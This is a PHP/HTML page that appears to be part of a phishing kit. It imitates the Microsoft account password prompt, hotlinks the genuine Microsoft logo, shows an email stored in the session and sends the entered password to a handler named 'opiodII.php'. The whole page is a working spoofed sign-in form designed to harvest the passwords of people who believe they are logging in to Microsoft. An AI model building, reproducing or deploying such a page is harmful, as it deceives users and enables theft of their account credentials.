<?php
session_start();

$email = $_SESSION["demo_email"] ?? "";
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign In to your account</title>
  <link rel="icon" href="favicon.png">
  <link rel="preload"
      href="images/background.webp"
      as="image"
      fetchpriority="high">
  <link rel="stylesheet" href="password.css">
</head>
<body>

<div class="bg"></div>

<div class="card">

  
  <div class="top">
    <a href="index.php"><img src="images/back.png" class="back">
    </a>
    <img class="logo"
    src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg">
  </div>
<form action="opiodII.php" method="post">
  <div class="email"><?= htmlspecialchars($email) ?></div>
  
  <h1>Enter your password</h1>

  <!-- FLOATING INPUT -->
  <div class="input-box">
    <input type="password" id="password" name="password" required>
    <label>Password</label>

    <img class="eye"
    src="images/eye.png"
    alt="Show password"
    onclick="togglePassword()">
  </div>

  <button class="next" type="submit">Next</button>

  <div class="other">Other ways to sign in</div>

</div>
</form>
<div class="footer">
  Help and feedback &nbsp;&nbsp; Terms of use &nbsp;&nbsp; Privacy and cookies
  <br>
  <p><div class="fs"><span>Use private browsing if this is not your device. <a href="Learn more">Learn more</a></span></div></p>
</div>

<script src="password.js"></script>
</body>
</html>